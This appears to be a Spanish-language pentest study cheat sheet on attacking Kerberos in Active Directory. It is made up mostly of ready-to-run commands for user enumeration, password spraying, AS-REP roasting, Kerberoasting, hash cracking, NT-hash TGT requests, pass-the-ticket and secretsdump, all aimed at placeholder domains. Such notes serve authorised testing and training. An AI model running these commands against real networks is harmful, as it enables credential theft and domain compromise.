# Kerberos (88)

Tags: #Kerberos #DC #Windows #AD #ASREPRoasting #Kerberoasting #UserEnum

## OBJETIVO
- Sincronizar reloj con el DC antes de cualquier ataque
- Enumerar usuarios válidos del dominio
- Identificar cuentas sin preautenticación (AS-REP Roasting)
- Identificar cuentas con SPNs (Kerberoasting)
- Obtener hashes crackeables offline

## TIPS
1. **Sincronizar reloj SIEMPRE antes de cualquier ataque → si difiere más de 5 min, todo falla con KRB_AP_ERR_SKEW**
2. **AS-REP Roasting → no necesitas creds → pruébalo siempre primero**
3. **Kerberoasting → necesitas solo una cuenta de dominio válida → cualquiera sirve**
4. **Si obtienes un hash → intenta crackearlo Y guárdalo aunque no crackee ahora**
5. **kerbrute es más sigiloso que LDAP/RPC para enumerar usuarios**

## TOOLS
* [Kerbrute](https://github.com/ropnop/kerbrute)
* [Impacket](https://github.com/fortra/impacket)
* [Hashcat](https://hashcat.net/hashcat/)
* [John the Ripper](https://github.com/openwall/john)
* [CrackStation](https://crackstation.net/)
* [Hashes.com](https://hashes.com/en/decrypt/hash)
* [Sprayhound](https://github.com/Hackndo/sprayhound)

## /etc/hosts — ANTES DE EMPEZAR
```bash
Siempre agregar la máquina al /etc/hosts antes de enumerar SMB.

# Máquina standalone (solo Windows, sin dominio)
❯ echo "192.168.5.22 castelblack" >> /etc/hosts
# Solo el hostname → suficiente para conectarse

# Máquina parte de dominio o DC
❯ echo "192.168.5.22 castelblack.kingdoms.local castelblack" >> /etc/hosts
# hostname + FQDN → necesario para autenticación Kerberos y SMB con dominio
# Si solo agregas el hostname → algunas herramientas fallan con el dominio
```

### Cómo saber si es standalone o parte de dominio
```bash
❯ nmap -p 88 <IP>
# Puerto 88 (Kerberos) abierto → es un DC o parte de dominio
# Puerto 88 cerrado → probablemente standalone

❯ nxc smb <IP>
# Output muestra: domain → si el dominio es igual al hostname → standalone
# Si el dominio es diferente al hostname → parte de un dominio real
```

## 0.1 SINCRONIZACIÓN DE RELOJ (OBLIGATORIO)

```bash
# Kerberos requiere que el reloj del atacante no difiera más de 5 minutos del DC
# Si no sincronizas → KRB_AP_ERR_SKEW → todos los ataques fallan

❯ sudo ntpdate <IP_DC>
# Sincronizar automáticamente con el DC
# Requiere: acceso al DC

❯ sudo ntpdate -u <IP_DC>
# Forzar sincronización ignorando si NTP ya está corriendo

❯ sudo rdate -n <IP_DC>
# Alternativa si ntpdate no está disponible

❯ sudo timedatectl set-ntp false
❯ sudo timedatectl set-time "YYYY-MM-DD HH:MM:SS"
# Ajuste manual como último recurso

❯ date
# Verificar que la hora quedó correcta después de sincronizar

❯ date -s "2025-01-04 15:30:00"   
# Restablecer la fecha y hora
```

### Insight importante
- **Sin sincronización → ningún ataque Kerberos funcionará**
- En el examen esto se olvida frecuentemente → ponlo como primer paso del checklist
- Si un ataque falla misteriosamente → revisar el reloj primero

---

## 1. ENUMERACIÓN DE USUARIOS (SIN CREDENCIALES)

```bash
❯ kerbrute userenum -d domain.corp --dc <IP> users.txt
# No requiere creds → valida usuarios contra el DC directamente vía Kerberos
# Más sigiloso que LDAP o RPC para enumerar usuarios

❯ kerbrute userenum --dc <IP> -d domain.corp \
  /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
# Wordlist grande → útil cuando no tienes ningún usuario conocido de partida

❯ kerbrute userenum --dc <IP> -d domain.corp users.txt -o valid_users.txt
# Guardar usuarios válidos a archivo → úsalo directamente en AS-REP Roasting
```

### Insight
- Kerberos responde diferente ante usuarios válidos e inválidos → eso es lo que kerbrute aprovecha
- La lista de válidos que obtienes aquí → alimenta directamente AS-REP Roasting
- Revisa la política de lockout antes de usar wordlists grandes

---

## 2. PASSWORD SPRAYING VÍA KERBEROS (SIN / CON CREDS)

```bash
❯ kerbrute passwordspray -d domain.corp --dc <IP> valid_users.txt 'Password123'
# No requiere creds previas → prueba una sola clave contra todos los usuarios
# Más sigiloso que spraying por SMB → menos logs generados
# Cuidado: puede bloquear cuentas si hay lockout policy activa

❯ kerbrute bruteuser -d domain.corp --dc <IP> administrator passwords.txt
# Fuerza bruta a un usuario específico
# Solo úsalo si sabes que no hay lockout policy
```

```bash 
# No autenticado 
# Single user, single password
sprayhound -u simba -p Pentest123.. -d Domain01.local -dc <IP>

# User list, single password
sprayhound -U ./users.txt -p Pentest123.. -d Domain01.local -dc <IP>

# User as pass
sprayhound -U ./users.txt -d Domain01.local -dc <IP>

# User as pass with password lowercase
sprayhound -U ./users.txt --lower -d Domain01.local -dc <IP>

# User as pass with password uppercase
sprayhound -U ./users.txt --upper -d Domain01.local -dc <IP>
```

```bash 
# Autenticado 
# Single user, single password
sprayhound -u simba -p Pentest123.. -d Domain01.local -dc <IP> -lu pixis -lp P4ssw0rd

# All domain users, single password
sprayhound -p Pentest123.. -d Domain01.local -dc <IP> -lu pixis -lp P4ssw0rd

# All domain users, single password, using an account from a trusted domain
sprayhound -p Pentest123.. -d Domain01.local -dc <IP> -lu 'babdcatha.net\Babd' -lp P4ssw0rd

# User as pass on all domain users
sprayhound -d Domain01.local -dc <IP> -lu pixis -lp P4ssw0rd

# User as pass with password lowercase
sprayhound --lower -d Domain01.local -dc <IP> -lu pixis -lp P4ssw0rd

# User as pass with password uppercase
sprayhound --upper -d Domain01.local -dc <IP> -lu pixis -lp P4ssw0rd
```

### Condiciones clave
- Lockout policy → **máximo 1 password por usuario por spray**
- Sin lockout → puedes ser más agresivo pero igual va despacio
- Si consigues creds → ve a SMB/WinRM/RDP a validarlas

---

## 3. AS-REP ROASTING (SIN CREDENCIALES)

```bash
# Ataca cuentas que tienen "Do not require Kerberos preauthentication" activado
# El DC responde con un TGT parcialmente cifrado con la clave del usuario
# Ese cifrado es crackeable offline → no necesitas interactuar más con el DC
# No requiere credenciales → solo una lista de usuarios válidos

❯ impacket-GetNPUsers domain.corp/ -no-pass -usersfile valid_users.txt -dc-ip <IP>
# No requiere creds → prueba todos los usuarios de la lista
# Devuelve hashes AS-REP de cuentas vulnerables

❯ impacket-GetNPUsers domain.corp/ -no-pass \
  -usersfile valid_users.txt -dc-ip <IP> -outputfile asrep_hashes.txt
# Igual pero guarda los hashes directamente a archivo para crackear

❯ impacket-GetNPUsers domain.corp/ -no-pass -dc-ip <IP> -request
# Sin lista de usuarios → intenta con null session
# Funciona solo si el DC permite null session (poco común en entornos modernos)

❯ impacket-GetNPUsers domain.corp/'user':'pass' -dc-ip <IP> -request
# Con credenciales válidas → enumera TODOS los usuarios vulnerables del dominio
# Más completo que sin creds → úsalo si ya tienes una cuenta

❯ impacket-GetNPUsers domain.corp/'user':'pass' \
  -dc-ip <IP> -request -outputfile asrep_hashes.txt
# Con creds y guardando hashes → la forma más completa

❯ nxc ldap <IP> -u 'user' -p 'pass' --asreproast asrep_hashes.txt
# Alternativa con netexec → requiere creds válidas
# Más rápido en dominios grandes con muchos usuarios
```

### Crackeo de hashes AS-REP

```bash
# El hash tiene formato $krb5asrep$23$...

❯ hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
# Modo 18200 → AS-REP Roasting
# Sin GPU → agrega --force

❯ hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule
# Con reglas → más probabilidad de crackear contraseñas complejas

❯ john --wordlist=/usr/share/wordlists/rockyou.txt asrep_hashes.txt
# Alternativa con John si no tienes hashcat
```

### Insight
- Si crackeas → tienes credenciales en claro → vuelve a SMB / WinRM / RDP con ellas
- Si no crackeas → guarda el hash para intentar con wordlists más grandes después
- Cuentas de servicio configuradas mal son el objetivo más frecuente

---

## 4. KERBEROASTING (CON CREDENCIALES)

```bash
# Ataca cuentas de servicio que tienen SPNs registrados en el dominio
# Solicitas un TGS para ese servicio → viene cifrado con la clave de la cuenta
# Ese cifrado es crackeable offline
# Requiere: cualquier cuenta de dominio válida → no necesitas ser admin

❯ impacket-GetUserSPNs domain.corp/'user':'pass' -dc-ip <IP>
# Requiere creds válidas → lista todas las cuentas con SPNs
# Solo lista, no solicita tickets todavía

❯ impacket-GetUserSPNs domain.corp/'user':'pass' -dc-ip <IP> -request
# Requiere creds válidas → solicita y devuelve tickets TGS crackeables

❯ impacket-GetUserSPNs domain.corp/'user':'pass' \
  -dc-ip <IP> -request -outputfile kerberoast_hashes.txt
# Guarda hashes a archivo directamente → listo para crackear

❯ impacket-GetUserSPNs domain.corp/'user':'pass' \
  -dc-ip <IP> -request -target-domain domain.corp
# Especificar dominio explícitamente → útil en entornos multi-dominio

❯ nxc ldap <IP> -u 'user' -p 'pass' --kerberoasting kerb_hashes.txt
# Alternativa con netexec → más rápido en dominios grandes
```

### Crackeo de hashes Kerberoast

```bash
# El hash tiene formato $krb5tgs$23$...

❯ hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
# Modo 13100 → Kerberoasting RC4 (más común)

❯ hashcat -m 19700 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
# Modo 19700 → Kerberoasting AES256 (más lento)

❯ hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule
# Con reglas → más probabilidad de crackear

❯ john --wordlist=/usr/share/wordlists/rockyou.txt kerberoast_hashes.txt
# Alternativa con John
```

### Insight
- Cuentas de servicio suelen tener contraseñas débiles → alta tasa de crackeo
- Si crackeas → tienes creds de cuenta de servicio → valida en SMB / WinRM
- Prioriza cuentas que estén en grupos privilegiados (revisa con BloodHound)
- RC4 (tipo 23) → más fácil de crackear que AES → si ves AES intenta forzar RC4

---

## 5. SOLICITAR TGT (CON CREDENCIALES O HASH)

```bash
# Obtener un ticket TGT desde Linux para usarlo en herramientas Kerberos
# Interactúa directamente con el puerto 88

❯ impacket-getTGT domain.corp/'user':'pass' -dc-ip <IP>
# Requiere creds válidas → genera archivo user.ccache en el directorio actual

❯ impacket-getTGT domain.corp/'user' -hashes :NThash -dc-ip <IP>
# Requiere NT hash → genera ticket sin necesitar password en claro
# Útil cuando tienes el hash pero no crackeaste la contraseña

❯ export KRB5CCNAME=user.ccache
# Activar el ticket → todas las herramientas de impacket lo usarán automáticamente

❯ klist
# Verificar que el ticket está activo y ver su expiración
```

### Insight
- Un TGT dura ~10 horas → suficiente para el examen
- KRB5CCNAME → variable que conecta este ticket con herramientas de lateral movement
- El uso del ticket en sí (psexec -k, wmiexec -k) va en las notas de lateral movement


---

## EXTRA: CONFIGURACIÓN DE KERBEROS EN KALI (krb5-user) CLIENTE

Krb5-user es el paquete de Linux que instala las herramientas cliente de Kerberos. La más importante es `kinit` — que te permite **obtener un TGT (Ticket Granting Ticket) usando credenciales de dominio desde Kali**.

En términos simples: es como hacer login en el dominio desde tu máquina Kali usando Kerberos.

```bash
❯ sudo apt install krb5-user
# Instala las herramientas cliente de Kerberos en Kali
# Habilita: kinit, klist, kdestroy → gestionar tickets desde Linux

❯ dpkg-reconfigure krb5-config  
# Si ya esta instalado se puede reconfigurar 
```

### Configurar /etc/krb5.conf
```bash
❯ sudo nano /etc/krb5.conf

[libdefaults]
    default_realm = DOMAIN.LOCAL
    dns_lookup_realm = false
    dns_lookup_kdc = false
    kdc_timesync = 1
    ccache_type = 4
    forwardable = true
    proxiable = true
    fcc-mit-ticketflags = true

[realms]
    DOMAIN.LOCAL = {
        kdc = <IP_DC>
        admin_server = <IP_DC>
    }

[domain_realm]
    .domain.local = DOMAIN.LOCAL
    domain.local = DOMAIN.LOCAL
# Cambiar DOMAIN.LOCAL por el dominio real del objetivo
# Cambiar <IP_DC> por la IP del Domain Controller
```

### Obtener y gestionar tickets TGT desde Kali
```bash
❯ kinit user@DOMAIN.LOCAL
# Requiere creds válidas → pide contraseña → genera TGT
# El ticket queda almacenado en /tmp/krb5cc_XXXX

❯ klist
# Ver tickets activos → usuario, expiración, realm

❯ kdestroy
# Eliminar todos los tickets activos → limpiar sesión
```

### Obtener un ticket válido usando impacket 
```bash 
❯ impacket-getTGT DOMAIN.LOCAL/user:password 
# Solicitar un ticket con credenciales válidas guardandolo en el archivo user.ccache
```

### Usar ticket con herramientas
```bash
❯ export KRB5CCNAME=/tmp/krb5cc_user.ccache
# Apuntar las herramientas al ticket activo

❯ smbclient -k @<DC_HOSTNAME>

❯ nxc smb <IP> -k --use-kcache
# Autenticación Kerberos sin contraseña en claro

❯ evil-winrm -i <IP> -r DOMAIN.LOCAL
# WinRM con Kerberos → -r en vez de -p

❯ impacket-secretsdump -k DOMAIN.LOCAL/user@<DC_HOSTNAME>
# Impacket con ticket Kerberos → -k activa el uso del ccache
```

### Casos:
1. Pass-the-Ticket → usar un ticket .ccache robado en Kali 
2. Autenticación Kerberos con impacket → cuando -k requiere ticket activo 
3. BloodHound con auth Kerberos → -k en bloodhound-python 
4. Evil-winrm con Kerberos → -r en vez de -p 
5. CrackMapExec/nxc con -k → autenticación sin contraseña en claro

### Insight

- kinit + klist → verificar que el ticket funciona antes de lanzar ataques
- Muy útil en Pass-the-Ticket → importar ticket .ccache robado y usarlo aquí
- KRB5CCNAME + impacket -k → autenticación sin tocar la contraseña


---

## CONDICIONES CLAVE
- Sin creds → enum usuarios + AS-REP Roasting
- Creds válidas → Kerberoasting + getTGT
- Hash NT → getTGT sin contraseña en claro
- Hash crackeado → reutilizar en SMB / WinRM / RDP

## ONE-LINERS MENTALES
- Puerto 88 abierto → sincronizar reloj PRIMERO siempre
- Sin creds → kerbrute para usuarios → AS-REP Roasting con esa lista
- Creds válidas → Kerberoasting inmediato
- Hash obtenido → crackear con hashcat -m 18200 o -m 13100
- Hash crackeado → volver a SMB y probar en todo
